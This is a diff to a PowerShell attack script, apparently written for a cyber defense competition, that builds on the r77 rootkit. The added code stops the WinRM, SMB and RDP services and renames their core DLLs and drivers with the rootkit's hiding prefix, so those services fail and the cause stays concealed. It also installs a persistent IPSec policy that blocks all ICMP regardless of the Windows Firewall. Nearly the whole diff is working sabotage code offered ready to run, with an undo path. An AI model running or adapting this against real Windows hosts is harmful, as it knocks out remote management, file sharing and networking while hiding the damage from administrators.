@@ -39,6 +39,23 @@
 #     Without zone files the DNS service loads but answers SERVFAIL for
 #     every authoritative zone.
 #
+#   WinRM critical files:
+#     wsmsvc.dll  -- WinRM service DLL; service cannot load without it.
+#     WsmRes.dll  -- WinRM resource DLL; companion required at runtime.
+#
+#   SMB critical files:
+#     srv2.sys    -- SMB2/3 file server kernel driver.
+#     srvnet.sys  -- SMB network transport driver (srv2.sys dependency).
+#
+#   RDP critical files:
+#     termsrv.dll -- Terminal Services DLL; RDP stack cannot initialize without it.
+#
+#   ICMP:
+#     ICMP is handled by tcpip.sys (kernel) -- hiding that file would break all
+#     networking and is not viable.  Instead, the ICMP role deploys a persistent
+#     IPSec policy via netsh ipsec static to block all ICMPv4 at the IP stack
+#     level, independent of the Windows Firewall service.
+#
 # Pre-requisites:
 #   - r77 rootkit must already be installed (run r77Shadow.ps1 first).
 #     The script warns but does NOT abort if r77 is not detected -- operator
@@ -49,8 +66,7 @@
 # Undo / post-competition restore:
 #   Run with -Undo after removing the r77 rootkit (so the $77 files are
 #   visible again).  The script walks the same paths and strips the prefix.
-#
-# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
+#   For the ICMP role, -Undo removes the IPSec policy (no file rename needed).
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 
 #Requires -RunAsAdministrator
@@ -58,7 +74,7 @@
 [CmdletBinding()]
 param(
     # Which service role(s) to target.
-    [ValidateSet('MSSQL', 'AD', 'DNS', 'All')]
+    [ValidateSet('MSSQL', 'AD', 'DNS', 'WinRM', 'SMB', 'RDP', 'ICMP', 'All')]
     [string]$Role = 'All',
 
     # Reverse the operation: strip the $77 prefix from known paths.
@@ -89,6 +105,7 @@ if ($Undo) {
     Write-Warn " CCDC Phase 3 -- r77 Hide Services"
 }
 Write-Warn " Role: $Role    Hide prefix: $HIDE_PREFIX"
+Write-Warn " Valid roles: MSSQL, AD, DNS, WinRM, SMB, RDP, ICMP, All"
 Write-Warn "================================================================"
 Write-Host ""
 
@@ -391,17 +408,155 @@ function Invoke-DNSHide {
 }
 
 # ============================================================
+# WinRM -- Hide wsmsvc.dll and WsmRes.dll
+# ============================================================
+function Invoke-WinRMHide {
+    param([bool]$RemovePrefix)
+
+    Write-Section "WinRM -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"
+
+    if (-not $RemovePrefix) {
+        Stop-ServiceGracefully -ServiceName "WinRM" | Out-Null
+    }
+
+    $sys32 = "$env:SystemRoot\System32"
+    $winrmFiles = @("wsmsvc.dll", "WsmRes.dll")
+
+    foreach ($fname in $winrmFiles) {
+        if ($RemovePrefix) {
+            $hiddenPath = Join-Path $sys32 "${HIDE_PREFIX}${fname}"
+            Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
+        } else {
+            $origPath = Join-Path $sys32 $fname
+            Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
+        }
+    }
+
+    Write-Info "WinRM service cannot load without wsmsvc.dll -- service will fail on next start attempt."
+}
+
+# ============================================================
+# SMB -- Hide srv2.sys and srvnet.sys
+# ============================================================
+function Invoke-SMBHide {
+    param([bool]$RemovePrefix)
+
+    Write-Section "SMB -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Driver Files"
+
+    if (-not $RemovePrefix) {
+        Stop-ServiceGracefully -ServiceName "LanmanServer" | Out-Null
+    }
+
+    $driversDir = "$env:SystemRoot\System32\drivers"
+    $smbFiles   = @("srv2.sys", "srvnet.sys")
+
+    foreach ($fname in $smbFiles) {
+        if ($RemovePrefix) {
+            $hiddenPath = Join-Path $driversDir "${HIDE_PREFIX}${fname}"
+            Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
+        } else {
+            $origPath = Join-Path $driversDir $fname
+            Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
+        }
+    }
+
+    Write-Info "SMB2/3 cannot function without srv2.sys and srvnet.sys -- LanmanServer will fail on next start."
+}
+
+# ============================================================
+# RDP -- Hide termsrv.dll
+# ============================================================
+function Invoke-RDPHide {
+    param([bool]$RemovePrefix)
+
+    Write-Section "RDP -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"
+
+    if (-not $RemovePrefix) {
+        Stop-ServiceGracefully -ServiceName "TermService" | Out-Null
+    }
+
+    $sys32   = "$env:SystemRoot\System32"
+    $rdpFile = "termsrv.dll"
+
+    if ($RemovePrefix) {
+        $hiddenPath = Join-Path $sys32 "${HIDE_PREFIX}${rdpFile}"
+        Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
+    } else {
+        $origPath = Join-Path $sys32 $rdpFile
+        Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
+    }
+
+    Write-Info "RDP stack cannot initialize without termsrv.dll -- TermService will fail on next start attempt."
+}
+
+# ============================================================
+# ICMP -- IPSec policy block (no r77 file rename possible)
+# ============================================================
+function Invoke-ICMPHide {
+    param([bool]$RemovePrefix)
+
+    Write-Section "ICMP -- $(if ($RemovePrefix) { 'Remove IPSec Block' } else { 'IPSec Block (firewall-independent)' })"
+
+    Write-Info "ICMP is handled by tcpip.sys (kernel) -- r77 file-rename would break all networking."
+    Write-Info "Using IPSec policy block via netsh ipsec static instead."
+
+    if ($RemovePrefix) {
+        & netsh.exe ipsec static set policy name=CCDC_ICMPKill assign=no 2>$null | Out-Null
+        & netsh.exe ipsec static delete policy name=CCDC_ICMPKill 2>$null | Out-Null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Success "IPSec policy CCDC_ICMPKill removed -- ICMP responses restored"
+        } else {
+            Write-Warn "IPSec policy removal returned rc=$LASTEXITCODE -- may not have existed"
+        }
+    } else {
+        $ipsecCmds = @(
+            @("ipsec", "static", "add", "policy", "name=CCDC_ICMPKill"),
+            @("ipsec", "static", "add", "filterlist", "name=AllICMP"),
+            @("ipsec", "static", "add", "filter", "filterlist=AllICMP", "srcaddr=any", "dstaddr=any", "protocol=icmp", "mirrored=yes"),
+            @("ipsec", "static", "add", "filteraction", "name=DropICMP", "action=block"),
+            @("ipsec", "static", "add", "rule", "name=KillICMP", "policy=CCDC_ICMPKill", "filterlist=AllICMP", "filteraction=DropICMP"),
+            @("ipsec", "static", "set", "policy", "name=CCDC_ICMPKill", "assign=yes")
+        )
+        $ipsecLabels = @(
+            "Created IPSec policy: CCDC_ICMPKill",
+            "Created filter list: AllICMP",
+            "Added ICMPv4 mirrored filter (any->any)",
+            "Added block filter action: DropICMP",
+            "Linked rule KillICMP -> AllICMP -> DropICMP",
+            "Assigned (activated) policy: CCDC_ICMPKill"
+        )
+        for ($i = 0; $i -lt $ipsecCmds.Count; $i++) {
+            & netsh.exe $ipsecCmds[$i] 2>$null | Out-Null
+            if ($LASTEXITCODE -eq 0) {
+                Write-Success $ipsecLabels[$i]
+            } else {
+                Write-Warn "$($ipsecLabels[$i]) -- rc=$LASTEXITCODE (may already exist)"
+            }
+        }
+        Write-Info "IPSec ICMP block survives Windows Firewall service stop/start"
+    }
+}
+
+# ============================================================
 # Dispatch by role
 # ============================================================
 $doMSSQL = $Role -eq 'MSSQL' -or $Role -eq 'All'
 $doAD    = $Role -eq 'AD'    -or $Role -eq 'All'
 $doDNS   = $Role -eq 'DNS'   -or $Role -eq 'All'
+$doWinRM = $Role -eq 'WinRM' -or $Role -eq 'All'
+$doSMB   = $Role -eq 'SMB'   -or $Role -eq 'All'
+$doRDP   = $Role -eq 'RDP'   -or $Role -eq 'All'
+$doICMP  = $Role -eq 'ICMP'  -or $Role -eq 'All'
 
 $removePrefix = [bool]$Undo
 
 if ($doMSSQL) { Invoke-MSSQLHide  -RemovePrefix $removePrefix }
 if ($doAD)    { Invoke-ADHide     -RemovePrefix $removePrefix }
 if ($doDNS)   { Invoke-DNSHide    -RemovePrefix $removePrefix }
+if ($doWinRM) { Invoke-WinRMHide  -RemovePrefix $removePrefix }
+if ($doSMB)   { Invoke-SMBHide    -RemovePrefix $removePrefix }
+if ($doRDP)   { Invoke-RDPHide    -RemovePrefix $removePrefix }
+if ($doICMP)  { Invoke-ICMPHide   -RemovePrefix $removePrefix }
 
 # ============================================================
 # Done
@@ -433,6 +588,13 @@ if ($Undo) {
     Write-Warn "               ${HIDE_PREFIX}edb.log  -> edb.log"
     Write-Warn "               ${HIDE_PREFIX}edb.chk  -> edb.chk"
     Write-Warn "       DNS:   ${HIDE_PREFIX}(zone).dns -> (zone).dns  (each zone file)"
+    Write-Warn "       WinRM: ${HIDE_PREFIX}wsmsvc.dll -> wsmsvc.dll"
+    Write-Warn "               ${HIDE_PREFIX}WsmRes.dll -> WsmRes.dll"
+    Write-Warn "       SMB:   ${HIDE_PREFIX}srv2.sys -> srv2.sys"
+    Write-Warn "               ${HIDE_PREFIX}srvnet.sys -> srvnet.sys"
+    Write-Warn "       RDP:   ${HIDE_PREFIX}termsrv.dll -> termsrv.dll"
+    Write-Warn "       ICMP:  netsh ipsec static set policy name=CCDC_ICMPKill assign=no"
+    Write-Warn "               netsh ipsec static delete policy name=CCDC_ICMPKill"
     Write-Warn "  7. Restart the stopped services."
 }
 Write-Success "================================================================"
